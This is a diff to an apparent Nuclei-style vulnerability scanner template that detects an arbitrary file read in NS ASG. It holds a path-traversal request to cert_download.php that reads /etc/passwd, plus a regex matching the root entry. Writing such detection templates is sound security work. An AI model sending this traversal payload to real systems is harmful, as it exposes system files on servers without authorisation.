@@ -4,10 +4,9 @@ info:
   name: NS ASG Arbitrary File Read
   author: pikpikcu
   severity: high
-  reference: https://zhuanlan.zhihu.com/p/368054963
   tags: nsasg,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
@@ -17,7 +16,7 @@ http:
 
       - type: regex
         regex:
-          - "root:.*:0:0"
+          - "root:[x*]:0:0"
 
       - type: status
         status:
